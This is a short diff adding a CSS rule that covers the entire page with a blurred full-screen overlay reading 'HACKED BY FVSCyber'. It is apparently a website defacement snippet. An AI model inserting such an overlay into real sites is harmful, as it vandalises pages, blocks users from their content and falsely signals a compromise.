@@ -1,0 +1,16 @@
+         body::after{
+            content: "JSO?? NO THIS CSS OVERLAY, HACKED BY FVSCyber";
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 2em;
+            display: flex;
+            color: #dbd9d9;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: #00000064;
+            backdrop-filter: blur(15px);
+            justify-content: center;
+            align-items: center;
+         }
